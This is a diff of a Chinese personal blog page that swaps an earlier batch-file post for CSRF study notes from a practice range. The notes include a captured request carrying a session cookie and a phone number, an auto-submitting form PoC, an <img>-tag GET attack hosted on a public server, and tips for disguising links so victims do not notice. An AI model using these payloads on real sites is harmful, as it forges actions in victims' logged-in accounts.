@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="bat实现微信电脑版多开, Cat00011cat,偏锋小白菜,网络日记,个人博客,BLOG">
-    <meta name="description" content="巧用bat多开微信">
+    <meta name="keywords" content="CSRF跨站请求伪造笔记整理, Cat00011cat,偏锋小白菜,网络日记,个人博客,BLOG">
+    <meta name="description" content="CSRF跨站请求伪造，是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +13,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>bat实现微信电脑版多开 | Cat00011cat</title>
+    <title>CSRF跨站请求伪造笔记整理 | Cat00011cat</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -325,7 +325,7 @@
 <script src="/libs/cryptojs/crypto-js.min.js"></script>
 <script>
     (function() {
-        let pwd = '';
+        let pwd = '389924b2f9e222d3c162ca06c22d3caf650960e3a3c8ff61b55c3337a39c5f5f';
         if (pwd && pwd.length > 0) {
             if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                 alert('密码错误，将返回主页！');
@@ -338,12 +338,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/lateral404/image/image/20200209015106.jfif')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">bat实现微信电脑版多开</h1>
+                    <h1 class="description center-align post-title">CSRF跨站请求伪造笔记整理</h1>
                 </div>
             </div>
         </div>
@@ -365,8 +365,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/bat%E7%BC%96%E7%A8%8B/">
-                                <span class="chip bg-color">bat编程</span>
+                            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">网络安全</span>
                             </a>
                         
                     </div>
@@ -377,8 +377,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%BE%AE%E4%BF%A1%E5%A4%9A%E5%BC%80/" class="post-category">
-                                微信多开
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
+                                网络安全
                             </a>
                         
                     </div>
@@ -390,28 +390,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-01-11
+                    2020-02-05
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-01-30
+                    2020-02-09
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    241
+                    1.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    4 分
                 </div>
                 
 				
@@ -427,26 +427,71 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><strong>新建一个.txt文本，输入下面的代码</strong></p>
-<p><em>根据自己微信实际安装路径，修改代码</em></p>
-<p>路径查看方式：</p>
-<p>右键微信-属性-目标</p>
-<p><strong>需要多开几个微信就复制几行代码就行。</strong></p>
-<p>格式：</p>
-<pre><code>start D:\"xxxxx"\WeChat\WeChat.exe</code></pre><pre><code>修改前
-D:\微信PC\WeChat\WeChat.exe
-修改后
-start D:\"微信PC"\WeChat\WeChat.exe
-start D:\"微信PC"\WeChat\WeChat.exe
-start D:\"微信PC"\WeChat\WeChat.exe
-
-这里我就同时开3个微信，
-开几个就写几行代码</code></pre><p><strong>效果</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200111222828.png" alt=""></p>
-<p><strong>注意</strong><br>‘不要用原来地址中的引号，’<br>‘切换英文输入状态下自己输入’</p>
-<blockquote>
-<p>将文件另存为，重命名<code>xxx.bat</code>保存类型【所有文件】编码【ANSI】最后点击保存<br>一定要带.bat后缀</p>
+                <blockquote>
+<p>跨站请求攻击，简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并运行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。这利用了web中用户身份验证的一个漏洞：<strong>简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的</strong>。</p>
 </blockquote>
+<h1 id="CSRF它与XSS的区别"><a href="#CSRF它与XSS的区别" class="headerlink" title="CSRF它与XSS的区别"></a>CSRF它与XSS的区别</h1><p><strong>XSS</strong> 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p>
+<h1 id="靶场实践"><a href="#靶场实践" class="headerlink" title="靶场实践"></a>靶场实践</h1><ul>
+<li><p>设置代理</p>
+</li>
+<li><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200209003403.png" alt=""></p>
+</li>
+</ul>
+<p>首先打开BURP神器，增加收货地址抓取一个数据包，ctrl r把数据包发送到重放器（发送过去之后就把拦截关了）这个时候我们会发现多了一条收货地址。 当我们在重发器点击一下Go 又多一条，一直点一直增；</p>
+<p>步骤如下：</p>
+<pre><code>POST /action.php HTTP/1.1
+Host: bug.chinacycc.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: */*
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Referer: https://bug.chinacycc.com/html/add_address.html
+Content-Length: 322
+Cookie: PHPSESSID=p12rr3l4ipon0hei2t08kuukb0; userid=112
+DNT: 1
+Connection: close
+
+type=add_address&amp;info=%E6%88%91%E6%98%AF%E9%9A%94%E5%A3%81%E7%9A%84%E8%80%81%E7%8E%8B%EF%BC%8C%E5%93%A6%E5%90%BC%E5%90%BC%E5%90%BC%E5%90%BC%E5%90%BC%E5%90%BC%E5%90%BC%E5%90%BC%E5%90%BC&amp;name=Cat00011cat&amp;mobile=17887920637&amp;id=&amp;addr_info=%E5%AE%89%E5%BE%BD%E7%9C%81%2F%E8%8A%9C%E6%B9%96%E5%B8%82%2F%E9%95%9C%E6%B9%96%E5%8C%BA</code></pre><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200209005426.png" alt=""></p>
+<h1 id="POST类型CSRF写入型"><a href="#POST类型CSRF写入型" class="headerlink" title="POST类型CSRF写入型"></a>POST类型CSRF写入型</h1><p>我们可以制作一个CSRFPoC链接</p>
+<p>copy浏览器打开 打开只会看到一个按钮；点击这个按钮就会添加一个收货地址，（当我们点击这个按钮后台就会执行一系列操作，向服务端发送数据包）</p>
+<ul>
+<li>制作过程</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200209005830.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200209010033.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200209010143.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200209010354.png" alt=""></p>
+<p>这个PoC就相当于重放，不过你得点一下按钮！<br>鸡肋de地方：需要受害者点击按钮<br>思路：JS自动化点击，Post csrf写入型 我们最多可以做到给受害者一个链接，受害者只要打开这个链接，并且受害者当前登录了这个账户</p>
+<ul>
+<li>自动化表单提交:</li>
+</ul>
+<pre><code>&lt;form action="地址" method=POST&gt;
+    &lt;input type="hidden" name="type" value="complaint" /&gt;
+&lt;/form&gt;
+&lt;script&gt; document.forms[0].submit();&lt;/script&gt;</code></pre><p>地址获取：<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200209011357.png" alt=""></p>
+<p>表单构造：<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200209011904.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200209011917.png" alt=""></p>
+<p>浏览器访问118.126.89.131/1.html     <strong>自动化点击</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200209012232.png" alt=""></p>
+<p>添加成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200209012256.png" alt=""></p>
+<p>当受害者访问攻击者构造的恶意url就会自动增加一个收货地址。</p>
+<p>（<del>截下的数据包不能有明确的用户id，有的话就不行</del>）</p>
+<h1 id="get类型的CSRF"><a href="#get类型的CSRF" class="headerlink" title="get类型的CSRF"></a>get类型的CSRF</h1><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200209012821.png" alt=""></p>
+<p>直接给用户一个链接就行，不用构造；说白了 get类型就是一段url 。</p>
+<p>优势：get类型de有一定信任度。因为url用的是被攻击网站的url。</p>
+<p>短网址缩短：suo.im</p>
+<p><strong>把短网址真实化，让受害者点击了没察觉。</strong><br>思路：</p>
+<pre><code>&lt;img src="GET请求URL"&gt;</code></pre><p>这个时候访问公网1.html会发现是一个打不开de图片 这个时候受害者de账户就已经下线了</p>
+<p>过程：</p>
+<p>获取GET Url，公网服务器创建html文本 写入代码 获取url发送给受害者浏览器访问118.126.89.131/1.html</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200209013130.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200209013722.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200209013808.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200209013914.png" alt=""></p>
+<p>原理，，浏览器都有一个特点，，会自动显示图片</p>
+<p><strong>重点</strong>：我们客户端不管是在银行进行转账、支付宝、等各种形式转账或登录账号 都是提交数据包到后端。csrf它可以伪造一个请求 让受害者自己触发这个请求<br>举例：也即是说你在进行转账汇款，而攻击者给你发送了它构造的数据包，这个时候你只需要点击攻击者构造的这个数据包 ，受害者的账户就会进行转账。<br>通俗来说，就是跟QQ空间发羞羞那种说说一个道理。</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -490,7 +535,7 @@ start D:\"微信PC"\WeChat\WeChat.exe
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://www.thecat.top/posts/19932.html">http://www.thecat.top/posts/19932.html</a>
+                    <a href="http://www.thecat.top/posts/21678.html">http://www.thecat.top/posts/21678.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -528,8 +573,8 @@ start D:\"微信PC"\WeChat\WeChat.exe
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/bat%E7%BC%96%E7%A8%8B/">
-                                    <span class="chip bg-color">bat编程</span>
+                                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">网络安全</span>
                                 </a>
                             
                         </div>
@@ -700,7 +745,7 @@ start D:\"微信PC"\WeChat\WeChat.exe
         repo: 'Leaving-a-message',
         owner: 'lateral404',
         admin: "lateral404",
-        id: '2020-01-11T22-28-04',
+        id: '2020-02-05T18-31-33',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -984,45 +1029,47 @@ start D:\"微信PC"\WeChat\WeChat.exe
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/posts/63097.html">
+                <a href="/posts/21678.html">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200129221955.jfif" class="responsive-img" alt="保姆级搭建Hexo步骤">
+                        <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200209015106.jfif" class="responsive-img" alt="CSRF跨站请求伪造笔记整理">
                         
-                        <span class="card-title">保姆级搭建Hexo步骤</span>
+                        <span class="card-title">CSRF跨站请求伪造笔记整理</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            控制台指令一顿搓，基本上都能搭建成功
+                            CSRF跨站请求伪造，是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-01-13
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-02-05
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Hexo%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" class="post-category">
-                                    Hexo常用命令
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
+                                    网络安全
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Hexo/">
-                        <span class="chip bg-color">Hexo</span>
+                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">网络安全</span>
                     </a>
                     
                 </div>
@@ -1036,30 +1083,31 @@ start D:\"微信PC"\WeChat\WeChat.exe
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/posts/30937.html">
+                <a href="/posts/61871.html">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200129221627.jfif" class="responsive-img" alt="用C语言画出一个“爱心”，撩妹技能杠杠的">
                         
-                        <span class="card-title">用C语言画出一个“爱心”，撩妹技能杠杠的</span>
+                        <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="/medias/featureimages/14.jpg" class="responsive-img" alt="越权漏洞笔记整理">
+                        
+                        <span class="card-title">越权漏洞笔记整理</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            巧用for循环画出爱心
+                            越权漏洞知识点总结
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-01-11
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-02-04
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/For%E5%BE%AA%E7%8E%AF/" class="post-category">
-                                    For循环
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
+                                    网络安全
                                 </a>
                             
                             
@@ -1069,8 +1117,8 @@ start D:\"微信PC"\WeChat\WeChat.exe
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/C%E8%AF%AD%E8%A8%80/">
-                        <span class="chip bg-color">C语言</span>
+                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">网络安全</span>
                     </a>
                     
                 </div>
